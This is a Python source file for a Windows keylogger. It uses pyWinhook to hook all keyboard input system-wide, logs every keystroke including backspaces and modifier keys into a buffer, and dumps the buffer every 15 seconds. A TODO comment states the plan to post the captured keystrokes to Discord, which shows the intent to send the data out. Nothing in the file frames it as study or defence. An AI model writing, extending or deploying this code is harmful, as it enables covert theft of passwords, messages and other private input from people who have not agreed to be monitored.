import threading
from threading import Lock

import pyWinhook
import pythoncom

log_buffer = r""
mutex = Lock()

# Constants
BUFFER_FLUSH_PERIOD = 15.0  # Seconds


def flush_buffer():
    """
    Flushes the keyboard input log buffer every BUFFER_FLUSH_PERIOD seconds
    :return: None
    """
    threading.Timer(BUFFER_FLUSH_PERIOD, flush_buffer).start()

    mutex.acquire()
    try:
        global log_buffer

        # Print the buffer contents
        # TODO make this post to discord or something
        print("=========================")
        print(log_buffer)
        print("=========================")

        # Empty the buffer
        log_buffer = r""
    finally:
        mutex.release()


def on_keyboard_event(event):
    """
    Event handler for keypress
    :param event: Keypress event
    :return: True
    """
    global log_buffer
    event_key = event.Key

    # Enter key
    if event_key == "Return":
        log_buffer += "\n"

    # Spacebar
    elif event_key == "Space":
        log_buffer += " "

    # Backspace
    elif event_key == "Back":
        log_buffer += "[BACKSPACE]"

    # Use the ASCII code for most standard printable characters
    elif 33 <= event.Ascii <= 126:
        log_buffer += chr(event.Ascii)

    # Other non-renderable keypress (i.e. WinKey, Shift)
    else:
        log_buffer += event.Key

    return True


# Setup the keyboard hooks
hooks_manager = pyWinhook.HookManager()
hooks_manager.KeyDown = on_keyboard_event
hooks_manager.HookKeyboard()

# Flush the log buffer every 15 seconds
flush_buffer()

# Continually poll for keyboard input
pythoncom.PumpMessages()
